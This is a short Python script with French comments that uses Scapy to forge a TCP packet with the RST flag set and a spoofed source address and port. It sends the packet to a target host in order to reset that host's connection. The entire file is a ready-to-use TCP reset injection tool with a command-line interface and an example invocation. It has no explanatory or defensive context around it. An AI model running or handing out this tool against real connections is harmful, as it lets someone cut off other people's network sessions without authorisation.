from scapy.all import *
import sys

def send_tcp_rst(target_ip, target_port, spoofed_ip, spoofed_port, seq_num):
    # Création du paquet IP
    ip = IP(src=spoofed_ip, dst=target_ip)
    
    # Création du paquet TCP avec le flag RST
    tcp = TCP(sport=spoofed_port, dport=target_port, flags="R", seq=seq_num)
    
    # Assemblage et envoi du paquet
    pkt = ip/tcp
    send(pkt, verbose=0)
    print(f"Paquet RST envoyé à {target_ip}:{target_port} en usurpant {spoofed_ip}:{spoofed_port}")

def main():
    if len(sys.argv) != 6:
        print("Usage: python tcp_rst.py <target_ip> <target_port> <spoofed_ip> <spoofed_port> <seq_num>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    spoofed_ip = sys.argv[3]
    spoofed_port = int(sys.argv[4])
    seq_num = int(sys.argv[5])
    
    send_tcp_rst(target_ip, target_port, spoofed_ip, spoofed_port, seq_num)

if __name__ == "__main__":
    main()


# usage -- python tcp_rst.py <ip_cible> <port_cible> <ip_usurpée> <port_usurpé> <numéro_de_séquence>
# Exemple -- python tcp_rst.py 192.168.1.2 9999 192.168.1.1 12345 1234567890

